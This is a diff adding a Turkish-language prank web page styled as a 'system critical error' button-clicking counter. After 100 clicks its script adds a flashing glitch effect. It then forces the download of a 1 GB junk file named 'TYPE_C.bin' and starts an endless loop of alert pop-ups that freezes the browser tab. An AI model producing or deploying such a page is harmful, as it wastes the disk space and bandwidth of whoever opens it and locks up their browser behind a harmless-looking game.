@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>SİSTEM KRİTİK HATA!</title>
+    <style>
+        body { margin: 0; background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
+        #counter { font-size: 180px; font-weight: 900; text-shadow: 5px 5px 0px #fff; margin-bottom: 20px; }
+        #btn { padding: 40px 100px; font-size: 50px; cursor: pointer; background: #ff0000; color: #fff; border: 10px double #fff; box-shadow: 0 0 30px #ff0000; font-weight: bold; outline: none; }
+        #btn:active { transform: scale(0.8); background: #fff; color: #f00; }
+        
+        /* Kaos Efekti */
+        .glitch { animation: glitch-anim 0.05s infinite; background: red !important; }
+        @keyframes glitch-anim {
+            0% { transform: translate(0); filter: hue-rotate(0deg) invert(0); }
+            20% { transform: translate(-20px, 20px); filter: invert(1); }
+            40% { transform: translate(20px, -20px); filter: hue-rotate(180deg); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="ui">
+        <div id="counter">0</div>
+        <button id="btn">TIKLA VE TAK!</button>
+    </div>
+
+    <script>
+        let count = 0;
+        let dosyaIndiMi = false;
+        const btn = document.querySelector('#btn');
+        const counterDisplay = document.querySelector('#counter');
+
+        btn.addEventListener('click', () => {
+            count++;
+            counterDisplay.innerText = count;
+
+            // SES: Her tıkta üst üste biner (Kirli işçilik)
+            const scream = new Audio('type-c-takicam.mp3');
+            scream.play().catch(() => {});
+
+            if (count >= 100) {
+                document.body.classList.add('glitch');
+
+                // 1. ADIM: DOSYA İNDİR (Sadece 1 kez)
+                if (!dosyaIndiMi) {
+                    const blob = new Blob([new ArrayBuffer(1024 * 1024 * 1024)], { type: 'application/octet-stream' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = "TYPE_C.bin"; // Dosya ismi güncellendi
+                    a.click();
+                    setTimeout(() => window.URL.revokeObjectURL(url), 100);
+                    dosyaIndiMi = true;
+
+                    // 2. ADIM: MESAJ SPAMINI BAŞLAT
+                    // İndirme bittikten yarım saniye sonra spam başlar
+                    setTimeout(() => {
+                        while(true) {
+                            alert("TYPE C TAKMA BAŞARILI!");
+                            alert("SİSTEME TYPE-C ENERJİSİ POMPALANIYOR...");
+                            alert("EFEYE SELAMLAR!");
+                            alert("BİLGİSAYAR ŞU AN TYPE-C OLDU.");
+                        }
+                    }, 500);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
